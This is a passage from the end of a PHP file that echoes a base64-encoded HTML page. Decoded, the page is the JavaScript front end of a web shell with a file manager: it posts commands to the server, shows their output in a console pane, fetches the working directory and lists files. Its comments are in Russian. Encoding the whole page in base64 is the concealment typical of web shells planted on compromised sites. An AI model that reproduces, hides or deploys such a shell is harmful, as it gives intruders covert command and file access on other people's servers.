VzKSB7CiAgICAgICAgICAgIGlmIChieXRlcyA9PT0gMCkgcmV0dXJuICcwIEInOwogICAgICAgICAgICB2YXIgayA9IDEwMjQ7CiAgICAgICAgICAgIHZhciBzaXplcyA9IFsnQicsICdLQicsICdNQicsICdHQiddOwogICAgICAgICAgICB2YXIgaSA9IE1hdGguZmxvb3IoTWF0aC5sb2coYnl0ZXMpIC8gTWF0aC5sb2coaykpOwogICAgICAgICAgICByZXR1cm4gcGFyc2VGbG9hdCgoYnl0ZXMgLyBNYXRoLnBvdyhrLCBpKSkudG9GaXhlZCgyKSkgKyAnICcgKyBzaXplc1tpXTsKICAgICAgICB9CgogICAgICAgIGZ1bmN0aW9uIGVzY2FwZUh0bWwoc3RyaW5nKSB7CiAgICAgICAgICAgIHZhciBkaXYgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCdkaXYnKTsKICAgICAgICAgICAgZGl2LnRleHRDb250ZW50ID0gc3RyaW5nOwogICAgICAgICAgICByZXR1cm4gZGl2LmlubmVySFRNTDsKICAgICAgICB9CgogICAgICAgIGZ1bmN0aW9uIG1ha2VSZXF1ZXN0KHVybCwgcGFyYW1zLCBjYWxsYmFjaykgewogICAgICAgICAgICB2YXIgeGhyID0gbmV3IFhNTEh0dHBSZXF1ZXN0KCk7CiAgICAgICAgICAgIHhoci5vcGVuKCJQT1NUIiwgdXJsLCB0cnVlKTsKICAgICAgICAgICAgeGhyLnNldFJlcXVlc3RIZWFkZXIoIkNvbnRlbnQtVHlwZSIsICJhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQiKTsKICAgICAgICAgICAgeGhyLm9ucmVhZHlzdGF0ZWNoYW5nZSA9IGZ1bmN0aW9uKCkgewogICAgICAgICAgICAgICAgaWYgKHhoci5yZWFkeVN0YXRlID09PSA0KSB7CiAgICAgICAgICAgICAgICAgICAgaWYgKHhoci5zdGF0dXMgPT09IDIwMCkgewogICAgICAgICAgICAgICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgdmFyIHJlc3BvbnNlSnNvbiA9IEpTT04ucGFyc2UoeGhyLnJlc3BvbnNlVGV4dCk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjYWxsYmFjayhyZXNwb25zZUpzb24pOwogICAgICAgICAgICAgICAgICAgICAgICB9IGNhdGNoIChlcnJvcikgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgY29uc29sZS5lcnJvcigiUGFyc2UgZXJyb3I6IiwgZXJyb3IsIHhoci5yZXNwb25zZVRleHQpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKGlzU2hlbGxBY3RpdmUpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBhcHBlbmRUb1NoZWxsKCdFcnJvcjogSW52YWxpZCByZXNwb25zZSBmcm9tIHNlcnZlcjxicj4nKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjcmVhdGVQcm9tcHQoKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgICAgIGlmIChpc1NoZWxsQWN0aXZlKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBhcHBlbmRUb1NoZWxsKCdFcnJvcjogUmVxdWVzdCBmYWlsZWQgKCcgKyB4aHIuc3RhdHVzICsgJyk8YnI+Jyk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjcmVhdGVQcm9tcHQoKTsKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfTsKICAgICAgICAgICAgCiAgICAgICAgICAgIHZhciBmb3JtRGF0YSA9IG5ldyBGb3JtRGF0YSgpOwogICAgICAgICAgICBmb3IgKHZhciBrZXkgaW4gcGFyYW1zKSB7CiAgICAgICAgICAgICAgICBpZiAocGFyYW1zW2tleV0gIT09IG51bGwgJiYgcGFyYW1zW2tleV0gIT09IHVuZGVmaW5lZCkgewogICAgICAgICAgICAgICAgICAgIGZvcm1EYXRhLmFwcGVuZChrZXksIHBhcmFtc1trZXldKTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgICAgICAKICAgICAgICAgICAgdmFyIHF1ZXJ5U3RyaW5nID0gQXJyYXkuZnJvbShmb3JtRGF0YS5lbnRyaWVzKCkpCiAgICAgICAgICAgICAgICAubWFwKChba2V5LCB2YWx1ZV0pID0+IGVuY29kZVVSSUNvbXBvbmVudChrZXkpICsgJz0nICsgZW5jb2RlVVJJQ29tcG9uZW50KHZhbHVlKSkKICAgICAgICAgICAgICAgIC5qb2luKCcmJyk7CiAgICAgICAgICAgIAogICAgICAgICAgICB4aHIuc2VuZChxdWVyeVN0cmluZyk7CiAgICAgICAgfQoKICAgICAgICAvLyA9PT09PT09PT09PT09PT09PT09PSDQmNCd0JjQptCY0JDQm9CY0JfQkNCm0JjQryA9PT09PT09PT09PT09PT09PT09PQogICAgICAgIAogICAgICAgIHdpbmRvdy5vbmxvYWQgPSBmdW5jdGlvbigpIHsKICAgICAgICAgICAgZVNoZWxsQ29udGVudCA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJzaGVsbC1jb250ZW50Iik7CiAgICAgICAgICAgIAogICAgICAgICAgICAvLyDQmNC90LjRhtC40LDQu9C40LfQuNGA0YPQtdC8INGC0LXQutGD0YnRg9GOINC00LjRgNC10LrRgtC+0YDQuNGOCiAgICAgICAgICAgIG1ha2VSZXF1ZXN0KCI/ZmVhdHVyZT1wd2QiLCB7fSwgZnVuY3Rpb24ocmVzcG9uc2UpIHsKICAgICAgICAgICAgICAgIGlmIChyZXNwb25zZS5jd2QpIHsKICAgICAgICAgICAgICAgICAgICBDV0QgPSBhdG9iKHJlc3BvbnNlLmN3ZCk7CiAgICAgICAgICAgICAgICAgICAgRk1fQ1dEID0gQ1dEOwogICAgICAgICAgICAgICAgICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdmbS1wYXRoLWlucHV0JykudmFsdWUgPSBGTV9DV0Q7CiAgICAgICAgICAgICAgICAgICAgY3JlYXRlUHJvbXB0KCk7CiAgICAgICAgICAgICAgICAgICAgbG9hZEZpbGVMaXN0KCk7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0pOwogICAgICAgICAgICAKICAgICAgICAgICAgLy8g0J7QsdGA0LDQsdC+0YLQutCwIEVudGVyINCyINC/0L7Qu9C1INCy0LLQvtC00LAg0L/Rg9GC0LgKICAgICAgICAgICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2ZtLXBhdGgtaW5wdXQnKS5hZGRFdmVudExpc3RlbmVyKCdrZXlwcmVzcycsIGZ1bmN0aW9uKGUpIHsKICAgICAgICAgICAgICAgIGlmIChlLmtleSA9PT0gJ0VudGVyJykgewogICAgICAgICAgICAgICAgICAgIGdvVG9QYXRoKCk7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0pOwogICAgICAgICAgICAKICAgICAgICAgICAgLy8g0JfQsNC60YDRi9GC0LjQtSDQvNC+0LTQsNC70YzQvdGL0YUg0L7QutC+0L0g0L/QviDQutC70LjQutGDINCy0L3QtQogICAgICAgICAgICB3aW5kb3cub25jbGljayA9IGZ1bmN0aW9uKGV2ZW50KSB7CiAgICAgICAgICAgICAgICBpZiAoY3VycmVudE1vZGFsICYmIGV2ZW50LnRhcmdldC5pZCA9PT0gY3VycmVudE1vZGFsKSB7CiAgICAgICAgICAgICAgICAgICAgaGlkZU1vZGFsKGN1cnJlbnRNb2RhbC5yZXBsYWNlKCdNb2RhbCcsICcnKSk7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH07CiAgICAgICAgICAgIAogICAgICAgICAgICAvLyDQpNC+0LrRg9GBINC90LAgc2hlbGwg0L/RgNC4INC60LvQuNC60LUg0L/QviDQutC+0L3RgdC+0LvQuAogICAgICAgICAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnc2hlbGwnKS5vbmNsaWNrID0gZnVuY3Rpb24oKSB7CiAgICAgICAgICAgICAgICBpZiAoaXNTaGVsbEFjdGl2ZSAmJiBjdXJyZW50SW5wdXQpIHsKICAgICAgICAgICAgICAgICAgICBjdXJyZW50SW5wdXQuZm9jdXMoKTsKICAgICAgICAgICAgICAgICAgICBwbGFjZUNhcmV0QXRFbmQoY3VycmVudElucHV0KTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfTsKICAgICAgICAgICAgCiAgICAgICAgICAgIC8vINCT0LvQvtCx0LDQu9GM0L3Ri9C1INCz0L7RgNGP0YfQuNC1INC60LvQsNCy0LjRiNC4CiAgICAgICAgICAgIGRvY3VtZW50Lm9ua2V5ZG93biA9IGZ1bmN0aW9uKGUpIHsKICAgICAgICAgICAgICAgIGlmIChlLmN0cmxLZXkgJiYgZS5rZXkgPT09ICdsJyAmJiBpc1NoZWxsQWN0aXZlKSB7CiAgICAgICAgICAgICAgICAgICAgZS5wcmV2ZW50RGVmYXVsdCgpOwogICAgICAgICAgICAgICAgICAgIGVTaGVsbENvbnRlbnQuaW5uZXJIVE1MID0gJyc7CiAgICAgICAgICAgICAgICAgICAgY3JlYXRlUHJvbXB0KCk7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH07CiAgICAgICAgfTs8L3NjcmlwdD48L2JvZHk+PC9odG0=')); ?>
